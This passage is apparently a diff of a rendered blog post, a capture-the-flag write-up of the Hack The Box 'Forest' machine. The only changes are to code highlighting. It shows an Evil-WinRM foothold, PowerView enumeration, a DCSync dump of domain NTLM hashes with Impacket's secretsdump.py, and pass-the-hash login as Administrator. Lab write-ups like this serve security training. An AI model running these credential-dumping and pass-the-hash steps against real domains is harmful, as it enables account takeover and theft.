-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc-alfresco<span style="color:#ae81ff">\D</span>ocuments&gt; 
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; 
 </span></span></code></pre></div><p>We have a foothold! Looking through the host, we don&rsquo;t really see anything interesting. Let&rsquo;s import PowerView and get some info about the account we now own.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\users\svc-alfresco&gt; Get-DomainUser -Identity svc-alfresco -Domain htb.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
 </span></span><span style="display:flex;"><span>
@@ -670,25 +640,25 @@
 </span></span><span style="display:flex;"><span>Verbose<span style="color:#960050;background-color:#1e0010">:</span> [Get-DomainSearcher] search base<span style="color:#960050;background-color:#1e0010">:</span> LDAP<span style="color:#960050;background-color:#1e0010">:</span>//DC=htb,DC=local
 </span></span><span style="display:flex;"><span>Verbose<span style="color:#960050;background-color:#1e0010">:</span> [Get-DomainObject] Get-DomainObject <span style="color:#66d9ef">filter</span> string<span style="color:#960050;background-color:#1e0010">:</span> (&amp;(|(|(samAccountName=HTB.LOCAL)(name=HTB.LOCAL)(dnshostname=HTB.LOCAL))))
 </span></span></code></pre></div><p>We should now have DCSync privileges. We can exploit this using Impacket&rsquo;s secretsdump.py</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$secretsdump.py -outputfile htb_hashes -just-dc rat@10.10.10.161                                              20:37:02 <span style="color:#f92672">[</span>78/171<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$secretsdump.py -outputfile htb_hashes -just-dc rat@10.10.10.161                                              20:37:02 <span style="color:#f92672">[</span>78/171<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                       
 </span></span><span style="display:flex;"><span>                                                                                                                                             
 </span></span><span style="display:flex;"><span>Password:                                                                                                                                    
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>                                                                                
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets                                                                                         
-</span></span><span style="display:flex;"><span>htb.local<span style="color:#ae81ff">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                       
+</span></span><span style="display:flex;"><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                
+</span></span><span style="display:flex;"><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                         
+</span></span><span style="display:flex;"><span>htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                       
 </span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                 
 </span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                              
 </span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                
-</span></span><span style="display:flex;"><span>htb.local<span style="color:#ae81ff">\$</span>331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-</span></span><span style="display:flex;"><span>htb.local<span style="color:#ae81ff">\S</span>M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                     
-</span></span><span style="display:flex;"><span>htb.local<span style="color:#ae81ff">\S</span>M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::               
-</span></span><span style="display:flex;"><span>htb.local<span style="color:#ae81ff">\S</span>M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                     
-</span></span><span style="display:flex;"><span>htb.local<span style="color:#ae81ff">\S</span>M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                     
-</span></span><span style="display:flex;"><span>htb.local<span style="color:#ae81ff">\S</span>M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                     
+</span></span><span style="display:flex;"><span>htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::               
+</span></span><span style="display:flex;"><span>htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                     
+</span></span><span style="display:flex;"><span>htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                     
+</span></span><span style="display:flex;"><span>htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span><span style="display:flex;"><span>&lt;SNIP&gt;
 </span></span></code></pre></div><p>Nice! Now that we have the Administrator&rsquo;s hash, we can use evil-winrm to PTH and login to the FOREST machine:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
 </span></span></code></pre></div><p>And grab the flag on the Administrator&rsquo;s desktop</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\Administrator\Desktop&gt; ls
 </span></span><span style="display:flex;"><span>
